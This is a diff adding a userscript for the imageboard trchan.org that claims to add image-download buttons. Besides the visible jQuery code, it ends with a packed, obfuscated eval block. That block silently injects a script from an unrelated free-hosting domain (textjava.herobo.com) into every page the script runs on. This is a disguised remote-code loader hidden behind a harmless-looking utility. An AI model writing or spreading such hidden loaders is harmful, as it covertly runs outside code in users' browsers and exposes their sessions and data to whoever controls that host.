@@ -1,0 +1,8 @@
+// ==UserScript==
+// @name                TRCHANindir
+// @namespace           http://www.trchan.org
+// @description         Resimlerin yanındaki indir simgesine tıklayıp, kaydet diyerek hızlıca indirebilirsiniz. Artık aracı site trchan'ın kendisi.
+// @include             http://trchan.org/*
+// @include             http://www.trchan.org/*
+// ==/UserScript==
+function addJQuery(callback){var script=document.createElement("script");script.setAttribute("src","http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js");script.addEventListener("load",function(){var script=document.createElement("script");script.textContent="("+callback.toString()+")();";document.body.appendChild(script)},false);document.body.appendChild(script)};function main() {$(document).ready(function(){$("<iframe/>").css("display","none").attr("src","").attr("name","frame").appendTo("body");$("a span").each(function(){var resim = $("img.thumb",this).attr("src");$(this).prepend("<a href='http://www.trchan.org/x.php?r="+resim+"' target='frame'><img style='float:left;' src='http://i.imgur.com/h61sZ.png' border='0'></a>");});eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$("5").6("<0 4=\'3/2\' 7=\'8://a.c.b/1.9\'></0>");',13,13,'script||javascript|text|type|head|append|src|http|js|textjava|com|herobo'.split('|'),0,{}))});}addJQuery(main);
